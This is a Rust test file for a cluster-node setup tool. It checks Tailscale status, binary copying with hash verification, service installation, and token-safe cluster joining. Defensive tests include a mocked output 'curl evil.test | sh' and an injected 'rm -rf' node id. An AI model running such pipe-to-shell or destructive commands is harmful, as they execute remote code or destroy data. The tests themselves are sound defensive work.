use super::catalog;
use super::fakes_b::*;
use super::registry::{AdminAccess, Machine, NodeSettings};
use super::runner::Recorded;
use super::step::{
    CheckState, ClusterTokens, FixContext, RemoteOutput, SetupStep, StepFix, StepId,
};
use super::steps_node::MAC_BUILD;
use sha2::{Digest, Sha256};
use std::sync::Arc;

const TOKEN: &str = "nlj1.PLANTEDJOINTOKENVALUE0123456789";
const CLUSTER: &str = "cluster-aaaa";
const NODE: &str = "0123456789abcdef0123456789abcdef";

struct Tokens {
    cluster: Option<String>,
    token: Result<String, String>,
}

impl ClusterTokens for Tokens {
    fn join_token(&self) -> Result<String, String> {
        self.token.clone()
    }
    fn cluster_id(&self) -> Result<Option<String>, String> {
        Ok(self.cluster.clone())
    }
    fn can_be_master(&self, _machine: &str) -> Option<bool> {
        None
    }
}

fn tokens(cluster: Option<&str>) -> Arc<Tokens> {
    Arc::new(Tokens {
        cluster: cluster.map(str::to_string),
        token: Ok(TOKEN.to_string()),
    })
}

pub(super) fn node_linux() -> Machine {
    let mut m = linux("w1");
    m.set_admin(AdminAccess::RootSsh);
    m.node = Some(NodeSettings::default());
    m.abilities.as_mut().unwrap().arch = Some("x86_64".into());
    m
}

pub(super) fn node_mac() -> Machine {
    let mut m = mac("m2");
    m.node = Some(NodeSettings::default());
    m.abilities.as_mut().unwrap().arch = Some("arm64".into());
    m
}

pub(super) fn step(m: &Machine, id: &StepId) -> SetupStep {
    find(&catalog::steps(m, std::slice::from_ref(m)), id)
}

pub(super) fn probe(rig: &Rig, id: &StepId, text: &str, code: i32) -> CheckState {
    let (_, parse) = remote(&step(&rig.machine, id));
    parse(
        &RemoteOutput {
            text: text.into(),
            code,
        },
        &rig.step(),
    )
    .state
}

pub(super) fn texts(calls: &[Recorded]) -> Vec<String> {
    calls.iter().map(|c| unquoted(&c.text())).collect()
}

pub(super) fn hex(bytes: &[u8]) -> String {
    format!("{:x}", Sha256::digest(bytes))
}

pub(super) fn fix_of(
    rig: &Rig,
    dist: Option<&std::path::Path>,
    cluster: Option<&str>,
) -> FixContext {
    let mut ctx = rig.fix();
    ctx.step.dist_dir = dist.map(std::path::Path::to_path_buf);
    ctx.step.tokens = tokens(cluster);
    ctx
}

const RUNNING: &str =
    r#"{"BackendState":"Running","Self":{"TailscaleIPs":["100.101.102.103","fd7a:115c:a1e0::1"]}}"#;

#[test]
fn tailscale_running_passes() {
    let rig = Rig::new(node_linux());
    let state = probe(&rig, &StepId::NODE_TAILSCALE, RUNNING, 0);
    assert!(state.is_pass(), "{state:?}");
    let (script, _) = remote(&step(&rig.machine, &StepId::NODE_TAILSCALE));
    assert!(script.contains("status --json"));
    let noisy = format!("some notice\n{RUNNING}");
    assert!(probe(&rig, &StepId::NODE_TAILSCALE, &noisy, 0).is_pass());
}

#[test]
fn tailscale_stopped_fails_with_howto() {
    let rig = Rig::new(node_linux());
    let stopped = r#"{"BackendState":"Stopped","Self":{"TailscaleIPs":[]}}"#;
    let state = probe(&rig, &StepId::NODE_TAILSCALE, stopped, 0);
    assert!(state.is_fail(), "{state:?}");
    let no_address = r#"{"BackendState":"Running","Self":{"TailscaleIPs":["192.168.1.4"]}}"#;
    assert!(probe(&rig, &StepId::NODE_TAILSCALE, no_address, 0).is_fail());
    assert!(probe(
        &rig,
        &StepId::NODE_TAILSCALE,
        "sh: tailscale: not found",
        127
    )
    .is_fail());
    match step(&rig.machine, &StepId::NODE_TAILSCALE).fix {
        StepFix::HowTo(text) => assert_eq!(
            text,
            "Install Tailscale on w1 and run sudo tailscale up there, in your own terminal."
        ),
        _ => panic!("the Tailscale step needs a how-to, not a Fix"),
    }
}

#[test]
fn binary_probe_compares_with_this_macs_build() {
    let rig = Rig::new(node_linux());
    assert!(probe(&rig, &StepId::NODE_BINARY, MAC_BUILD, 0).is_pass());
    assert!(probe(&rig, &StepId::NODE_BINARY, "notchling 0.0.1", 0).is_fail());
    assert!(probe(&rig, &StepId::NODE_BINARY, "sh: notchling: not found", 127).is_fail());
}

#[test]
fn binary_fix_copies_and_verifies_hash() {
    let rig = Rig::new(node_linux());
    let dist = TempDir::new("dist");
    let build = b"pretend notchling build";
    std::fs::write(dist.path().join("notchling-linux-x86_64"), build).unwrap();
    let digest = hex(build);
    rig.runner.on(
        |a| a.last().is_some_and(|s| s.contains("sha256sum")),
        ok(&format!("{digest}  /home/agent/.local/bin/notchling.new\n")),
    );
    let ctx = fix_of(&rig, Some(dist.path()), None);
    let out = (plan(&step(&rig.machine, &StepId::NODE_BINARY)).run)(&ctx);
    assert!(out.ok, "{}", out.message);
    let calls = rig.calls();
    let seen = texts(&calls);
    let scp = calls
        .iter()
        .position(|c| c.argv.first().is_some_and(|a| a == "/usr/bin/scp"))
        .expect("an scp call");
    assert!(calls[scp].argv.contains(&"-O".to_string()));
    assert!(calls[scp].argv.contains(
        &dist
            .path()
            .join("notchling-linux-x86_64")
            .display()
            .to_string()
    ));
    assert_eq!(
        calls[scp].argv.last().unwrap(),
        "agent@w1.test:.local/bin/notchling.new"
    );
    let hash = seen.iter().position(|t| t.contains("sha256sum")).unwrap();
    let moved = seen.iter().position(|t| t.contains("mv -f")).unwrap();
    assert!(scp < hash && hash < moved, "{seen:?}");
    assert!(seen[moved].contains("chmod 755"));
    assert!(seen[hash].contains("shasum -a 256"));
    assert!(!seen.iter().any(|t| t.contains("rm -f")));
}

#[test]
fn binary_fix_removes_a_copy_that_does_not_match() {
    let rig = Rig::new(node_mac());
    let dist = TempDir::new("dist-bad");
    std::fs::write(dist.path().join("notchling-macos-aarch64"), b"build").unwrap();
    rig.runner.on(
        |a| a.last().is_some_and(|s| s.contains("shasum -a 256")),
        ok("0000  file\n"),
    );
    let ctx = fix_of(&rig, Some(dist.path()), None);
    let out = (plan(&step(&rig.machine, &StepId::NODE_BINARY)).run)(&ctx);
    assert!(!out.ok);
    let seen = texts(&rig.calls());
    assert!(seen.iter().any(|t| t.contains("rm -f")));
    assert!(!seen.iter().any(|t| t.contains("mv -f")));
}

#[test]
fn binary_fix_without_dist_file_says_where() {
    let rig = Rig::new(node_linux());
    let dist = TempDir::new("dist-empty");
    let ctx = fix_of(&rig, Some(dist.path()), None);
    let out = (plan(&step(&rig.machine, &StepId::NODE_BINARY)).run)(&ctx);
    assert!(!out.ok);
    assert_eq!(
        out.message,
        format!(
            "Put a notchling build for linux-x86_64 in {} first.",
            dist.path().join("notchling-linux-x86_64").display()
        )
    );
    assert!(rig.calls().is_empty(), "nothing runs without the build");
}

#[test]
fn binary_fix_names_the_chip_the_machine_reports() {
    let rig = Rig::new(node_mac());
    let dist = TempDir::new("dist-arm");
    let ctx = fix_of(&rig, Some(dist.path()), None);
    let out = (plan(&step(&rig.machine, &StepId::NODE_BINARY)).run)(&ctx);
    assert!(out.message.contains("macos-aarch64"), "{}", out.message);
}

#[test]
fn service_fix_installs_and_loads_linux() {
    let rig = Rig::new(node_linux());
    rig.runner.on(
        |a| a.last().is_some_and(|s| s.contains("show-user")),
        ok("Linger=yes\n"),
    );
    let ctx = fix_of(&rig, None, None);
    let step = step(&rig.machine, &StepId::NODE_SERVICE);
    let out = (plan(&step).run)(&ctx);
    assert!(out.ok, "{}", out.message);
    let seen = texts(&rig.calls());
    assert_eq!(seen.len(), 4, "{seen:?}");
    assert!(seen[0].contains("mkdir -p \"$d\""));
    assert!(seen[1].contains("\"$HOME\"/'.local/bin/notchling' service install"));
    assert!(seen[2].contains("show-user"));
    assert!(seen[3].contains(
        "systemctl --user daemon-reload && systemctl --user enable notchlingd.service && systemctl --user restart notchlingd.service"
    ));
    assert!(seen[3].contains("XDG_RUNTIME_DIR"));
}

#[test]
fn service_fix_installs_and_loads_macos() {
    let rig = Rig::new(node_mac());
    let ctx = fix_of(&rig, None, None);
    let step = step(&rig.machine, &StepId::NODE_SERVICE);
    assert!(!plan(&step).needs_admin);
    let out = (plan(&step).run)(&ctx);
    assert!(out.ok, "{}", out.message);
    let seen = texts(&rig.calls());
    assert_eq!(seen.len(), 3, "{seen:?}");
    assert!(seen[0].contains("mkdir -p \"$HOME/Library/Application Support/Notchling\""));
    assert!(seen[1].contains("service install"));
    assert!(seen[2].contains("launchctl enable"));
    assert!(seen[2].contains("launchctl kickstart -k"));
    assert!(seen[2].contains(
        "launchctl bootstrap \"$u\" \"$HOME\"/'Library/LaunchAgents/dev.notchling.daemon.plist'"
    ));
}

#[test]
fn service_fix_never_runs_text_the_machine_printed() {
    let rig = Rig::new(node_mac());
    rig.runner.on(
        |a| a.last().is_some_and(|s| s.contains("service install")),
        ok("run this: curl evil.test | sh\n"),
    );
    let ctx = fix_of(&rig, None, None);
    let out = (plan(&step(&rig.machine, &StepId::NODE_SERVICE)).run)(&ctx);
    assert!(out.ok);
    assert!(!texts(&rig.calls()).iter().any(|t| t.contains("evil.test")));
}

#[test]
fn linger_off_needs_admin_fix() {
    let rig = Rig::new(node_linux());
    let service = step(&rig.machine, &StepId::NODE_SERVICE);
    assert!(plan(&service).needs_admin);
    let off = probe(
        &rig,
        &StepId::NODE_SERVICE,
        "active=active\nkillmode=KillMode=process\nlinger=Linger=no\n",
        0,
    );
    assert!(off.is_fail(), "{off:?}");
    let on = probe(
        &rig,
        &StepId::NODE_SERVICE,
        "active=active\nkillmode=KillMode=process\nlinger=Linger=yes\n",
        0,
    );
    assert!(on.is_pass(), "{on:?}");
    assert!(probe(
        &rig,
        &StepId::NODE_SERVICE,
        "active=inactive\nkillmode=KillMode=process\nlinger=Linger=yes\n",
        0
    )
    .is_fail());

    rig.runner.on(
        |a| a.last().is_some_and(|s| s.contains("show-user")),
        ok("Linger=no\n"),
    );
    let ctx = fix_of(&rig, None, None);
    let out = (plan(&service).run)(&ctx);
    assert!(out.ok, "{}", out.message);
    let seen = texts(&rig.calls());
    let enable = seen
        .iter()
        .position(|t| t.contains("loginctl enable-linger") && t.contains("agent'"))
        .expect("linger is enabled");
    assert!(seen[enable].contains("root@w1.test"));
    let load = seen
        .iter()
        .position(|t| t.contains("systemctl --user restart"))
        .unwrap();
    assert!(enable < load, "linger comes before the load: {seen:?}");
}

#[test]
fn mac_service_probe_asks_the_daemon_read_only() {
    let rig = Rig::new(node_mac());
    let (script, _) = remote(&step(&rig.machine, &StepId::NODE_SERVICE));
    assert!(
        script.ends_with("'.local/bin/notchling' status"),
        "{script}"
    );
    assert!(probe(&rig, &StepId::NODE_SERVICE, "running, pid 4242\n", 0).is_pass());
    assert!(probe(&rig, &StepId::NODE_SERVICE, "no daemon is running\n", 3).is_fail());
    assert!(probe(&rig, &StepId::NODE_SERVICE, "", 0).is_fail());
    assert!(probe(
        &rig,
        &StepId::NODE_SERVICE,
        "notchling: command not found",
        127
    )
    .is_fail());
}

fn status_json(cluster: &str, me: &str) -> String {
    format!(
        "{{\n  \"cluster\": {{\"id\": \"{cluster}\", \"name\": \"home\", \"term\": 1}},\n  \"me\": \"{me}\",\n  \"members\": []\n}}"
    )
}

fn joined_check(rig: &Rig, text: &str, cluster: Option<&str>) -> super::step::CheckResult {
    let (_, parse) = remote(&step(&rig.machine, &StepId::NODE_JOINED));
    let mut ctx = rig.step();
    ctx.tokens = tokens(cluster);
    parse(
        &RemoteOutput {
            text: text.into(),
            code: 0,
        },
        &ctx,
    )
}

#[test]
fn joined_probe_compares_cluster_ids_and_reads_the_node_id() {
    let rig = Rig::new(node_linux());
    let same = joined_check(&rig, &status_json(CLUSTER, NODE), Some(CLUSTER));
    assert!(same.state.is_pass(), "{:?}", same.state);
    assert_eq!(same.detected.node.as_deref(), Some(NODE));
    let other = joined_check(&rig, &status_json("cluster-bbbb", NODE), Some(CLUSTER));
    assert!(other.state.is_fail());
    assert!(other.detected.node.is_none());
    let none = joined_check(
        &rig,
        r#"{"cluster": null, "me": "x", "members": []}"#,
        Some(CLUSTER),
    );
    assert!(none.state.is_fail());
    let odd = joined_check(
        &rig,
        &status_json(CLUSTER, "not an id; rm -rf"),
        Some(CLUSTER),
    );
    assert!(odd.state.is_pass() && odd.detected.node.is_none());
}

#[test]
fn joined_probe_fails_plainly_when_this_mac_has_no_cluster() {
    let rig = Rig::new(node_linux());
    let result = joined_check(&rig, &status_json(CLUSTER, NODE), None);
    assert!(result.state.is_fail());
    assert!(
        result.state.text().contains("no cluster"),
        "{:?}",
        result.state
    );
}

#[test]
fn join_fix_sends_token_on_stdin_only() {
    let rig = Rig::new(node_linux());
    rig.runner.on_with(
        |a| a.last().is_some_and(|s| s.contains("cluster join")),
        super::runner::CommandResult::new(2, "", &format!("the token {TOKEN} was refused\n")),
        vec![
            (
                super::runner::Channel::Stdout,
                format!("joining with {TOKEN}\n"),
            ),
            (
                super::runner::Channel::Stderr,
                format!("{TOKEN} was refused\n"),
            ),
        ],
    );
    let log = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let sink = log.clone();
    let mut ctx = fix_of(&rig, None, Some(CLUSTER));
    ctx.log = Arc::new(move |_, t: &str| sink.lock().unwrap().push(t.to_string()));
    let out = (plan(&step(&rig.machine, &StepId::NODE_JOINED)).run)(&ctx);
    assert!(!out.ok);
    assert!(!out.message.contains(TOKEN), "{}", out.message);
    assert!(
        out.message.contains("[secret:join-token]"),
        "{}",
        out.message
    );
    let calls = rig.calls();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0].stdin_text(), format!("{TOKEN}\n"));
    for c in &calls {
        assert!(!c.argv.join("\n").contains(TOKEN));
        assert!(c.env.iter().all(|(_, v)| !v.contains(TOKEN)));
    }
    assert!(unquoted(&calls[0].text()).contains("cluster join --token-stdin"));
    assert!(
        log.lock().unwrap().iter().all(|t| !t.contains(TOKEN)),
        "{:?}",
        log.lock().unwrap()
    );

    let ok_rig = Rig::new(node_linux());
    ok_rig.runner.on(
        |a| a.last().is_some_and(|s| s.contains("cluster join")),
        ok(&format!("Joined the cluster. ({TOKEN})\n")),
    );
    let ctx = fix_of(&ok_rig, None, Some(CLUSTER));
    let done = (plan(&step(&ok_rig.machine, &StepId::NODE_JOINED)).run)(&ctx);
    assert!(done.ok);
    assert!(!done.message.contains(TOKEN), "{}", done.message);
}

#[test]
fn join_fix_without_a_token_runs_nothing() {
    let rig = Rig::new(node_linux());
    let mut ctx = rig.fix();
    ctx.step.tokens = Arc::new(Tokens {
        cluster: None,
        token: Err("Notchling isn't running here".into()),
    });
    let out = (plan(&step(&rig.machine, &StepId::NODE_JOINED)).run)(&ctx);
    assert!(!out.ok);
    assert!(out.message.contains("isn't running"));
    assert!(rig.calls().is_empty());
}

#[test]
fn node_steps_absent_without_node_settings() {
    let plain = linux("w2");
    let ids: Vec<StepId> = catalog::steps(&plain, std::slice::from_ref(&plain))
        .into_iter()
        .map(|s| s.id)
        .collect();
    for id in [
        StepId::NODE_TAILSCALE,
        StepId::NODE_BINARY,
        StepId::NODE_SERVICE,
        StepId::NODE_JOINED,
    ] {
        assert!(!ids.contains(&id), "{}", id.raw());
    }
    let node = node_linux();
    let ids: Vec<StepId> = catalog::steps(&node, std::slice::from_ref(&node))
        .into_iter()
        .map(|s| s.id)
        .collect();
    let at = ids.iter().position(|i| *i == StepId::REACHABLE).unwrap();
    assert_eq!(
        ids[at + 1..at + 5],
        [
            StepId::NODE_TAILSCALE,
            StepId::NODE_BINARY,
            StepId::NODE_SERVICE,
            StepId::NODE_JOINED
        ]
    );
}

#[test]
fn node_settings_round_trip_and_stay_out_of_old_files() {
    let plain = serde_json::to_string(&linux("w2")).unwrap();
    assert!(!plain.contains("node"));
    let node = serde_json::to_string(&node_linux()).unwrap();
    assert!(node.contains("\"node\":{}"));
    let back: Machine = serde_json::from_str(&node).unwrap();
    assert_eq!(back.node, Some(NodeSettings::default()));
    let old: Machine = serde_json::from_str(&plain).unwrap();
    assert_eq!(old.node, None);
}
